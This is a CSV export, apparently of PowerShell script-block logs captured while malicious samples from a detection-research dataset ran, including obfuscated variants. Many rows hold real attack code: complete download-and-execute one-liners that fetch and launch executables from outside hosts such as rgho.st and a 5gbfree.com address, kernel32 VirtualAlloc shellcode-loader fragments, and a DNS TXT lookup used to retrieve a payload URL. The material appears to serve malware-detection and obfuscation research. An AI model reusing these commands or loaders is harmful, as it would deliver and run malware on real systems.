"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:23:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:49 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1671.ps1","2614"," (('cLYc = Cx'+'Y[DllImport(VsOkernel32.dllVsO)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSiz'+'e, uint fl'+'Allocati'+'onType, uint flProtect);[DllImport(VsOkernel32.dllVsO)]p"
"8/6/2026 10:23:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:40 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1671.ps1","20","{ ( [ChAr][iNT]$_) }"
"8/6/2026 10:23:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1671.ps1","7663","& ( $shellid[1]+$sHElLID[13]+'X')( ( '36X99y32_61r32a39l91a68a108y108r73@109r112X111y114X116a40l34a107i101y114r110l101r108a51@50r46r100i108w108X34_41l93y112X117i98_108i105l99r32w115_116r97X116r105a99i"
"8/6/2026 10:23:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1671.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1666.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:16 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1666.ps1","3037"," .( $EnV:coMsPec[4,24,25]-jOIN'') ( (((""{34}{7}{1}{17}{18}{19}{61}{21}{59}{40}{70}{33}{65}{28}{43}{37}{29}{66}{56}{24}{32}{22}{63}{12}{10}{4}{69}{5}{25}{49}{48}{16}{64}{3}{26}{58}{55}{42}{51}{47}{27}{"
"8/6/2026 10:23:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:23:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:23:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:08 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:23:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1666.ps1","2718"," &( ([StriNG]$veRBOSeprefeREncE)[1,3]+'x'-jOIn'')(('Madc = Yw3[Dll'+'Import(YI7'+'kernel32.dllYI7)]pub'+'lic stat'+'ic extern IntPtr VirtualAll'+'oc(IntPtr lpAddress, uint dwSize'+', uint flAllocation"
"8/6/2026 10:23:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:23:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:23:00 AM","","2323","  $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:23:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1666.ps1","21","{( [iNt]$_-aS[ChaR])}"
"8/6/2026 10:23:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1666.ps1","10250",""" $( sEt-VariabLE  'ofs'  '' ) "" +[stRiNG](( 36, 99 , 32 ,61 , 32 ,39 ,91 ,68 , 108,108 , 73 ,109, 112 ,111 ,114,116, 40 , 34 , 107, 101 , 114, 110, 101, 108 ,51,50 , 46,100 , 108 , 108 , 34, 41 , 93,"
"8/6/2026 10:22:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1666.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:22:45 AM","","9","$global:?"
"8/6/2026 10:22:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1619.ps1","142","(new-`o`BJecT System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");sTArT-`PR`OCesS (""$env:TEMP\wincat.exe"")
"
"8/6/2026 10:22:37 AM","","9","$global:?"
"8/6/2026 10:22:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:36 AM","","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1619.ps1","469","&((vaRIabLe '*mDR*').nAME[3,11,2]-join'')( (((""{12}{8}{30}{17}{1}{31}{11}{16}{25}{28}{18}{9}{5}{2}{26}{27}{20}{6}{10}{29}{0}{14}{24}{22}{15}{19}{3}{7}{13}{23}{4}{21}"" -f 'e{1}','ebClient).Downlo','jYl"
"8/6/2026 10:22:29 AM","","9","$global:?"
"8/6/2026 10:22:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:28 AM","","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1619.ps1","474"," (('('+'New'+'-Obj'+'ect '+'Sys'+'t'+'em.Net.WebClie'+'nt'+').Down'+'l'+'oa'+'dFile'+'(r5'+'Ghttp'+'://rgho'+'.st/6hrkjYl'+'X4r'+'5G,vXaL7Ne'+'nv:TEM'+'P'+'C5c'+'wi'+'n'+'c'+'at.exev'+'Xa'+')'+';Start"
"8/6/2026 10:22:21 AM","","9","$global:?"
"8/6/2026 10:22:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:20 AM","","138"," (New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"") "
"8/6/2026 10:22:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1619.ps1","22","{([Int]$_-As [cHaR]) }"
"8/6/2026 10:22:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1619.ps1","772"," . ((Gv '*mdr*').NAMe[3,11,2]-jOIN'')( ""$(SEt-iTEM  'VARIaBle:oFS'  '') ""+ [STRing]((40 ,78, 101 , 119 ,45 , 79 , 98, 106,101,99 ,116,32, 83 ,121,115, 116, 101,109, 46 ,78 , 101 , 116 , 46 , 87, 101 ,"
"8/6/2026 10:22:13 AM","","9","$global:?"
"8/6/2026 10:22:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1619.ps1","136","(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',""$env:TEMP\wincat.exe"");Start-Process (""$env:TEMP\wincat.exe"")"
"8/6/2026 10:22:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:22:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:22:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:22:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:22:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1614.ps1","140","(n`EW-OBJ`eCT System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');starT-`pRO`c`Ess 'fleeble.exe'
"
"8/6/2026 10:21:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:56 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1614.ps1","467"," ((""{32}{30}{10}{18}{23}{1}{13}{3}{27}{31}{28}{20}{15}{5}{2}{11}{4}{22}{6}{25}{8}{0}{16}{19}{21}{17}{7}{26}{24}{12}{29}{9}{14}"" -f'Dp','.WebClient).Downlo','bf','V','ee.com/','5g','e.','.','VDp,V','eb"
"8/6/2026 10:21:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:48 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1614.ps1","344"," (('(New-Obje'+'ct S'+'ystem.Ne'+'t.'+'We'+'b'+'Clien'+'t).Do'+'wnl'+'oad'+'Fil'+'e(Sv2'+'http:'+'//matk'+'alv.5g'+'bfree.co'+'m/noza'+'/o'+'de'+'ee.'+'exeSv2,Sv'+'2fleeble.e'+'xe'+'Sv2)'+';S'+'tart'+"
"8/6/2026 10:21:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:40 AM","","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1614.ps1","18","{([char] [iNt]$_)}"
"8/6/2026 10:21:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1614.ps1","701","&( ([STRINg]$VErBOsEPREFEReNce)[1,3]+'x'-joIn'')( ( (40 ,78 ,101,119,45 ,79 , 98,106,101 , 99, 116, 32,83 ,121,115 ,116,101, 109,46,78, 101 ,116 , 46 , 87 , 101 ,98 ,67 ,108 , 105,101, 110 , 116,41,46"
"8/6/2026 10:21:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:21:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:21:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:21:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:21:32 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1614.ps1","133","(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:21:24 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1604.ps1","344","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((I`Ex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$w"
"8/6/2026 10:21:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1604.ps1","2339","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (gEt-w`MI`OB`JECT Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((g`P HKCU:\\Software\Microsoft\Windows\Curr"
"8/6/2026 10:21:16 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:16 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:16 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:21:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1604.ps1","3612"," . ( $SHELLID[1]+$shellId[13]+'x') ( ((""{43}{0}{15}{29}{47}{38}{40}{58}{24}{57}{39}{27}{52}{21}{51}{26}{17}{35}{45}{23}{13}{55}{49}{28}{8}{22}{36}{50}{14}{30}{46}{3}{41}{44}{7}{42}{20}{31}{32}{11}{10}"
"8/6/2026 10:21:08 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:08 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:08 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:21:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1604.ps1","3307"," ('r4KLXUnfqnr4K;Rw4ErrorActionPr'+'eference = r4KSilentlyContinuer4K;r4KJlnlr4K;r4KrXrPGggbr4K;Rw4by = (get-wmiobject Win32_ComputerSystemProduct).U'+'UID;r4KkjEvisMrr4K;r4KBlwFKzHgxr4K;if ((gp HKCU:"
"8/6/2026 10:21:00 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:21:00 AM","","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:21:00 AM","","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:20:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1604.ps1","10239",". ( $sHeLLID[1]+$SHElLiD[13]+'X') ( -joiN [cHAR[]]( 39,76 ,88,85, 110,102 , 113 ,110 ,39 , 59 ,36,69 , 114 ,114,111 , 114 , 65 , 99 ,116,105, 111 ,110, 80, 114 ,101 , 102,101 ,114,101 , 110,99 ,101 , "
"8/6/2026 10:20:52 AM","","43","nslookup -querytype=txt i.vankin.de 8.8.8.8"
"8/6/2026 10:20:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1604.ps1","342","function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws"
"8/6/2026 10:20:51 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1604.ps1","2305","'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentV"
"8/6/2026 10:20:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1602.ps1","2251","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:35 AM","","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1602.ps1","2980",".( ([STRing]$VErbOsEPreFEreNcE)[1,3]+'X'-jOIn'')((((""{59}{56}{13}{36}{61}{38}{23}{34}{17}{41}{53}{18}{0}{24}{46}{35}{52}{55}{5}{6}{10}{43}{32}{25}{50}{67}{49}{22}{9}{66}{48}{21}{64}{2}{15}{30}{58}{47}"
"8/6/2026 10:20:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:27 AM","","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1602.ps1","2696"," (('42v0ab = YaS[Dl'+'lImport(ALMkernel32.dllALM)]public static extern In'+'tPtr VirtualAll'+'oc(IntPtr lpAddress, uint dwSize, uint flAllocationTyp'+'e, uint flProtect);[DllImport(ALMkernel32.dll'+'A"
"8/6/2026 10:20:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:19 AM","","2246"," $0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:20:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1602.ps1","9887",""" $( sET 'oFs' '' )"" +[stRING][chAR[]] (36 ,48 ,97 ,98 ,32, 61,32 , 39,91,68 ,108 ,108 , 73 ,109, 112 ,111, 114,116 ,40 , 34 , 107 , 101 , 114 , 110,101 , 108, 51,50, 46, 100 , 108, 108,34,41 ,93,112,"
"8/6/2026 10:20:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:11 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1602.ps1","2244","$0ab = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:20:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:20:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:20:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:20:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:20:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1590.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:19:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
